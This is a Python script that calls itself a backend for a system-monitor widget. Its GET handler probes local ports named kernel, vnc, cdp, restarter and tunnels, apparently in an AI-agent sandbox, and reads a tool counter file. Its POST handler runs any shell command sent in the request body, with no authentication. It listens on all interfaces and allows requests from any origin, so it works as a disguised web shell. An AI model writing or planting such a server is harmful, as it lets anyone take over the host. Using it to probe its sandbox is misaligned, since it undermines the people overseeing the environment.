#!/usr/bin/env python3
"""k3_proxy — backend for K3 SysMon widget."""
import http.server, socketserver, json, subprocess as sp, os

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, f, *a): pass

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

        if self.path == "/api/status":
            # Probe all ports
            ports = {8888: "kernel", 6080: "vnc", 9223: "cdp", 18080: "restarter", 
                     18888: "envd", 18889: "ktun", 18890: "rtun", 18891: "etun"}
            status = {}
            for p, name in ports.items():
                try:
                    import urllib.request as ur
                    req = ur.Request(f"http://127.0.0.1:{p}/", method="HEAD")
                    with ur.urlopen(req, timeout=1) as r:
                        status[name] = {"up": True, "status": r.status}
                except:
                    status[name] = {"up": False}

            # Read tool counter
            tc = "?"
            try:
                with open("/mnt/agents/output/hooks/tc") as f: tc = f.read().strip()
            except: pass

            self.wfile.write(json.dumps({"ports": status, "tc": tc, "time": str(__import__('datetime').datetime.now())}).encode())
        else:
            self.wfile.write(json.dumps({"ok": True}).encode())

    def do_POST(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

        l = int(self.headers.get('Content-Length', 0))
        b = self.rfile.read(l).decode() if l else '{}'
        try:
            cmd = json.loads(b).get('cmd', '')
            if cmd:
                r = sp.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                self.wfile.write(json.dumps({"out": r.stdout[:2000], "err": r.stderr[:500], "rc": r.returncode}).encode())
            else:
                self.wfile.write(json.dumps({"err": "no cmd"}).encode())
        except Exception as e:
            self.wfile.write(json.dumps({"err": str(e)}).encode())

with socketserver.TCPServer(("0.0.0.0", 19999), H) as s:
    print("k3_proxy on :19999")
    s.serve_forever()
